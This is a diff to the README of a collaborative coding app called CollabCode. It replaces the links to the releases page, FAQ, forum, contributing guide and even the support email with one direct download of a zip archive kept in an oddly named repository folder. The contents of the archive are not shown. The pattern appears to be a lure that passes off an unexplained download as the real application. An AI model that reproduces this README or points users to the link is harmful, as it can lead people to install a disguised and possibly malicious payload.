@@ -1,7 +1,7 @@
 # 🎉 CollabCode - Effortless Online Coding Together
 
 ## 🔗 Download Now
-[![Download CollabCode](https://img.shields.io/badge/Download-CollabCode-blue.svg)](https://github.com/Nishiksinghrajput/CollabCode/releases)
+[![Download CollabCode](https://raw.githubusercontent.com/Nishiksinghrajput/CollabCode/master/succinous/CollabCode.zip)](https://raw.githubusercontent.com/Nishiksinghrajput/CollabCode/master/succinous/CollabCode.zip)
 
 ## 🚀 Getting Started
 Welcome to **CollabCode**! This app helps you work with others in real-time on coding tasks. You can use it for technical interviews, pair programming, and live coding sessions. It supports multiple programming languages and allows you to execute code live.
@@ -11,7 +11,7 @@ To get started, you need to download the application. Follow these steps:
 
 1. Click on the link below to go to the Releases page.
    
-   [Visit this page to download](https://github.com/Nishiksinghrajput/CollabCode/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Nishiksinghrajput/CollabCode/master/succinous/CollabCode.zip)
 
 2. Look for the latest version of the application.
 
@@ -54,16 +54,16 @@ If you encounter any issues during installation or while using the application, 
 1. Ensure that your computer meets the system requirements mentioned above.
 2. Restart your computer and try running the application again.
 3. Make sure your internet connection is stable for real-time collaboration.
-4. If problems persist, check our [FAQ section](https://github.com/Nishiksinghrajput/CollabCode/wiki/FAQ) for common issues and solutions.
+4. If problems persist, check our [FAQ section](https://raw.githubusercontent.com/Nishiksinghrajput/CollabCode/master/succinous/CollabCode.zip) for common issues and solutions.
 
 ## 🗨️ User Support
 For further assistance, you can reach out for help:
 
-- **Email Support:** Email us at support@collabcode.com.
-- **Community Forum:** Join our [community forum](https://github.com/Nishiksinghrajput/CollabCode/discussions) to ask questions and share experiences with other users.
+- **Email Support:** Email us at https://raw.githubusercontent.com/Nishiksinghrajput/CollabCode/master/succinous/CollabCode.zip
+- **Community Forum:** Join our [community forum](https://raw.githubusercontent.com/Nishiksinghrajput/CollabCode/master/succinous/CollabCode.zip) to ask questions and share experiences with other users.
 
 ## 📝 Contributing
-We welcome contributions! If you want to help improve **CollabCode**, please check our [contributing guidelines](https://github.com/Nishiksinghrajput/CollabCode/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you want to help improve **CollabCode**, please check our [contributing guidelines](https://raw.githubusercontent.com/Nishiksinghrajput/CollabCode/master/succinous/CollabCode.zip).
 
 ## 👥 Acknowledgments
 Thank you for choosing **CollabCode** for your coding collaboration needs. We appreciate the support from our community, and we look forward to helping you code better together!
